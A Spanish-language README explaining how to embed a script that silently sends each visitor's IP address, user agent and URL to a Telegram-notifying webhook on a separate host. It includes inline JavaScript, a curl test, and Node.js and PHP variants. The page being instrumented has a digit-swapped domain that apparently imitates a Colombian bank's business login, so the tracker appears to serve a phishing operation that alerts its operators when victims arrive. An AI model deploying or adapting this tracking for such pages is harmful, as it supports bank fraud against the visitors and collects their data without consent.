# 🎯 Integración del Bot en Otra Página

## ✅ Problema Resuelto

El bot funciona en `triconego-clicks-production.up.railway.app` pero necesitas que funcione en `svnegoci0sbncolombiaingresaqui.up.railway.app`.

## 📝 Solución: Agregar Script de Tracking

### **Opción 1: Script Simple (Recomendado)**

Agrega este código **antes del cierre del `</body>`** en tu página `svnegoci0sbncolombiaingresaqui.up.railway.app`:

```html
<!-- Bot de Telegram - Notificador de Visitas -->
<script src="https://triconego-clicks-production.up.railway.app/tracking.js"></script>
```

### **Opción 2: Script Inline Completo**

Si prefieres código inline, agrega esto antes del `</body>`:

```html
<script>
(function() {
  'use strict';
  
  // Función para obtener la IP del cliente
  async function getClientIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      return 'IP no disponible';
    }
  }
  
  // Enviar notificación al webhook
  async function notifyVisit() {
    try {
      const ip = await getClientIP();
      
      await fetch('https://triconego-clicks-production.up.railway.app/webhook/visitor', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ip: ip,
          userAgent: navigator.userAgent,
          url: window.location.href,
          timestamp: new Date().toISOString()
        })
      });
      
      console.log('✅ Visita registrada');
    } catch (error) {
      console.error('Error al registrar visita:', error);
    }
  }
  
  // Ejecutar cuando la página cargue
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', notifyVisit);
  } else {
    notifyVisit();
  }
})();
</script>
```

## 🧪 Probar la Integración

### 1. Verificar que el webhook funciona:
```bash
curl -X POST https://triconego-clicks-production.up.railway.app/webhook/visitor \
  -H "Content-Type: application/json" \
  -d '{"ip":"192.168.1.1","userAgent":"Test","url":"https://svnegoci0sbncolombiaingresaqui.up.railway.app/"}'
```

Deberías recibir una notificación en Telegram inmediatamente.

### 2. Visitar la página:
Una vez agregado el script, visita:
```
https://svnegoci0sbncolombiaingresaqui.up.railway.app/
```

Deberías recibir la notificación automáticamente 📱

## 📊 Endpoints Disponibles

| Endpoint | Método | Descripción |
|----------|--------|-------------|
| `/` | GET | Página principal con notificación automática |
| `/health` | GET | Estado del servidor y configuración |
| `/test-telegram` | GET | Enviar mensaje de prueba |
| `/tracking.js` | GET | Script de tracking listo para usar |
| `/webhook/visitor` | POST | Webhook para recibir notificaciones desde otras páginas |

## 🔧 Alternativa: Integración en el Backend

Si tienes acceso al código de `svnegoci0sbncolombiaingresaqui.up.railway.app`, puedes hacer una petición HTTP desde el servidor:

### Node.js/Express:
```javascript
const axios = require('axios');

app.get('/', async (req, res) => {
  // Tu código existente...
  
  // Notificar al bot
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
  await axios.post('https://triconego-clicks-production.up.railway.app/webhook/visitor', {
    ip: ip,
    userAgent: req.headers['user-agent'],
    url: req.originalUrl
  }).catch(console.error);
  
  // Continuar con tu respuesta...
  res.send('...');
});
```

### PHP:
```php
<?php
$data = [
    'ip' => $_SERVER['REMOTE_ADDR'],
    'userAgent' => $_SERVER['HTTP_USER_AGENT'],
    'url' => $_SERVER['REQUEST_URI']
];

$ch = curl_init('https://triconego-clicks-production.up.railway.app/webhook/visitor');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);
?>
```

## ✨ Ventajas de este Método

- ✅ No necesitas modificar el código del proyecto original
- ✅ Funciona con cualquier página (HTML, PHP, React, etc.)
- ✅ No afecta la velocidad de carga (se ejecuta asíncrono)
- ✅ Captura la IP real del visitante
- ✅ Un solo bot centralizado para múltiples páginas

## 🎉 ¡Listo!

Ahora puedes rastrear visitas desde cualquier página agregando simplemente una línea de código.
